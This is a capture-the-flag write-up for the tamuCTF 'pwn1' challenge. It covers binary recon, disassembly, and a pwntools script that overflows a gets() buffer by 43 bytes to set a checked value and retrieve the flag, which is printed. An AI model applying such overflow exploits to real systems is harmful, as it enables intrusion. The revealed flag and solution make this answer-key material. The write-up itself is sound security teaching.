# tamuCTF: pwn

## pwn1
#### Assumeably the easiest among the pwn challenges, I started the approach by running some simple recon with the *checksec* utility from pwntools:
```
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
#### So we know we're dealing with a 32-bit binary with the following security measures added. *Add explanation*. Running the binary, we get the prompt:
```
$ ./pwn1
   Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see. 
   What... is your name?
```
#### Given the prompt and disassembly from gdb, I deduced that there is a string check for these questions. So what I did was use the command line utility *strings* on the binary and I got answers for the first two questions:
```
$ strings pwn1
   [...]
   Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
   What... is your name?
   Sir Lancelot of Camelot
   I don't know that! Auuuuuuuugh!
   What... is your quest?
   To seek the Holy Grail.
   What... is my secret?
   [...]
```
#### We now passed the first two questions, leaving us with only one more whose answer isn't shown up on strings or anywhere else. Fired up gdb-peda and disassembled the binary to have a deeper look into it. Disassembling the main function results into:
```
$ gdb ./pwn1
   gdb-peda$ disas main
   Dump of assembler code for function main:
      0x00000779 <+0>:	    lea    ecx,[esp+0x4]
      0x0000077d <+4>:	    and    esp,0xfffffff0
      0x00000780 <+7>:	    push   DWORD PTR [ecx-0x4]
      0x00000783 <+10>:	    push   ebp
      0x00000784 <+11>:	    mov    ebp,esp
      0x00000786 <+13>:	    push   ebx
      0x00000787 <+14>:	    push   ecx
      0x00000788 <+15>:	    sub    esp,0x40
      0x0000078b <+18>:	    call   0x600 <__x86.get_pc_thunk.bx>
      0x00000790 <+23>:	    add    ebx,0x1820
      0x00000796 <+29>:	    mov    eax,DWORD PTR [ebx+0x44]
      0x0000079c <+35>:	    mov    eax,DWORD PTR [eax]
      0x0000079e <+37>:	    push   0x0
      0x000007a0 <+39>:	    push   0x0
      0x000007a2 <+41>:	    push   0x2
      0x000007a4 <+43>:	    push   eax
      0x000007a5 <+44>:	    call   0x580 <setvbuf@plt>
      0x000007aa <+49>:	    add    esp,0x10
      0x000007ad <+52>:	    mov    DWORD PTR [ebp-0xc],0x2
      0x000007b4 <+59>:	    mov    DWORD PTR [ebp-0x10],0x0
      0x000007bb <+66>:	    sub    esp,0xc
      0x000007be <+69>:	    lea    eax,[ebx-0x1620]
      0x000007c4 <+75>:	    push   eax
      0x000007c5 <+76>:	    call   0x550 <puts@plt>
      0x000007ca <+81>:	    add    esp,0x10
      0x000007cd <+84>:	    sub    esp,0xc
      0x000007d0 <+87>:	    lea    eax,[ebx-0x15b5]
      0x000007d6 <+93>:	    push   eax
      0x000007d7 <+94>:	    call   0x550 <puts@plt>
      0x000007dc <+99>:	    add    esp,0x10
      0x000007df <+102>:	mov    eax,DWORD PTR [ebx+0x40]
      0x000007e5 <+108>:	mov    eax,DWORD PTR [eax]
      0x000007e7 <+110>:	sub    esp,0x4
      0x000007ea <+113>:	push   eax
      0x000007eb <+114>:	push   0x2b
      0x000007ed <+116>:	lea    eax,[ebp-0x3b]
      0x000007f0 <+119>:	push   eax
      0x000007f1 <+120>:	call   0x530 <fgets@plt>
      0x000007f6 <+125>:	add    esp,0x10
      0x000007f9 <+128>:	sub    esp,0x8
      0x000007fc <+131>:	lea    eax,[ebx-0x159f]
      0x00000802 <+137>:	push   eax
      0x00000803 <+138>:	lea    eax,[ebp-0x3b]
      0x00000806 <+141>:	push   eax
      0x00000807 <+142>:	call   0x510 <strcmp@plt>
      0x0000080c <+147>:	add    esp,0x10
      0x0000080f <+150>:	test   eax,eax
      0x00000811 <+152>:	je     0x82f <main+182>
      0x00000813 <+154>:	sub    esp,0xc
      0x00000816 <+157>:	lea    eax,[ebx-0x1584]
      0x0000081c <+163>:	push   eax
      0x0000081d <+164>:	call   0x550 <puts@plt>
      0x00000822 <+169>:	add    esp,0x10
      0x00000825 <+172>:	sub    esp,0xc
      0x00000828 <+175>:	push   0x0
      0x0000082a <+177>:	call   0x560 <exit@plt>
      0x0000082f <+182>:	sub    esp,0xc
      0x00000832 <+185>:	lea    eax,[ebx-0x1564]
      0x00000838 <+191>:	push   eax
      0x00000839 <+192>:	call   0x550 <puts@plt>
      0x0000083e <+197>:	add    esp,0x10
      0x00000841 <+200>:	mov    eax,DWORD PTR [ebx+0x40]
      0x00000847 <+206>:	mov    eax,DWORD PTR [eax]
      0x00000849 <+208>:	sub    esp,0x4
      0x0000084c <+211>:	push   eax
      0x0000084d <+212>:	push   0x2b
      0x0000084f <+214>:	lea    eax,[ebp-0x3b]
      0x00000852 <+217>:	push   eax
      0x00000853 <+218>:	call   0x530 <fgets@plt>
      0x00000858 <+223>:	add    esp,0x10
      0x0000085b <+226>:	sub    esp,0x8
      0x0000085e <+229>:	lea    eax,[ebx-0x154d]
      0x00000864 <+235>:	push   eax
      0x00000865 <+236>:	lea    eax,[ebp-0x3b]
      0x00000868 <+239>:	push   eax
      0x00000869 <+240>:	call   0x510 <strcmp@plt>
      0x0000086e <+245>:	add    esp,0x10
      0x00000871 <+248>:	test   eax,eax
      0x00000873 <+250>:	je     0x891 <main+280>
      0x00000875 <+252>:	sub    esp,0xc
      0x00000878 <+255>:	lea    eax,[ebx-0x1584]
      0x0000087e <+261>:	push   eax
      0x0000087f <+262>:	call   0x550 <puts@plt>
      0x00000884 <+267>:	add    esp,0x10
      0x00000887 <+270>:	sub    esp,0xc
      0x0000088a <+273>:	push   0x0
      0x0000088c <+275>:	call   0x560 <exit@plt>
      0x00000891 <+280>:	sub    esp,0xc
      0x00000894 <+283>:	lea    eax,[ebx-0x1534]
      0x0000089a <+289>:	push   eax
      0x0000089b <+290>:	call   0x550 <puts@plt>
      0x000008a0 <+295>:	add    esp,0x10
      0x000008a3 <+298>:	sub    esp,0xc
      0x000008a6 <+301>:	lea    eax,[ebp-0x3b]
      0x000008a9 <+304>:	push   eax
      0x000008aa <+305>:	call   0x520 <gets@plt>
      0x000008af <+310>:	add    esp,0x10
      0x000008b2 <+313>:	cmp    DWORD PTR [ebp-0x10],0xdea110c8
      0x000008b9 <+320>:	jne    0x8c2 <main+329>
      0x000008bb <+322>:	call   0x6fd <print_flag>
      0x000008c0 <+327>:	jmp    0x8d4 <main+347>
      0x000008c2 <+329>:	sub    esp,0xc
      0x000008c5 <+332>:	lea    eax,[ebx-0x1584]
      0x000008cb <+338>:	push   eax
      0x000008cc <+339>:	call   0x550 <puts@plt>
      0x000008d1 <+344>:	add    esp,0x10
      0x000008d4 <+347>:	mov    eax,0x0
      0x000008d9 <+352>:	lea    esp,[ebp-0x8]
      0x000008dc <+355>:	pop    ecx
      0x000008dd <+356>:	pop    ebx
      0x000008de <+357>:	pop    ebp
      0x000008df <+358>:	lea    esp,[ecx-0x4]
      0x000008e2 <+361>:	ret    
   End of assembler dump.
```
#### We see that the prompts for the first two questions get user input via fgets, which is a quite secure way of getting user input. But the third question at address ```0x0000089b``` uses a gets() call for input, which is vulnerable to buffer overflow attacks. It is also important to note that the program also checks if the answer for the third question is equal to ```0xdea110c8``` before it proceeds to the ```print_flag``` function. So the exploit method for this challenge will be a buffer overflow into controlling an argument. But before we head that, we do a deeper analysis of the code block that happens before and after the gets call. 
```
      0x000008a0 <+295>:	add    esp,0x10
      0x000008a3 <+298>:	sub    esp,0xc
      0x000008a6 <+301>:	lea    eax,[ebp-0x3b]
      0x000008a9 <+304>:	push   eax
      0x000008aa <+305>:	call   0x520 <gets@plt>
      0x000008af <+310>:	add    esp,0x10
      0x000008b2 <+313>:	cmp    DWORD PTR [ebp-0x10],0xdea110c8
```
#### What this does is allocates space on the stack for some variables, which is the array buffer in this case, and pushes a pointer to ```[ebp-0x3b]``` , which is the address for the array buffer, on the stack. After the gets call, a compare instruction is done at address ```[ebp-0x10]``` if the contents is in fact equal to ```0xdea110c8```. So it becomes clearer that we have to overwrite the contents of ```[ebp-0x3b]``` to ```[ebp-0x10]```, which has a difference of 43 which is the offset we need to overflow the buffer. And we proceed with the exploitation.
#### exploit.py
```python
   from pwn import *

   #: Connect to challenge server
   HOST = 'pwn.tamuctf.com'
   PORT = 4321
   conn = remote(HOST,PORT)

   #: Exploit code
   offset = 'A' * 43
   secret = p32(0xdea110c8)
   exploit = offset + secret

   #: Send data
   print(conn.recv())
   conn.sendline('Sir Lancelot of Camelot')
   print(conn.recv())
   conn.sendline('To seek the Holy Grail.')
   print(conn.recv())
   conn.sendline(exploit)
   print(conn.recv())
   print(conn.recv())
```
#### And we then get the flag! 
```
$ python exploit.py

   Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
   What... is your name?

   What... is your quest?

   What... is my secret?

   Right. Off you go.
   gigem{34sy_CC428ECD75A0D392}
```
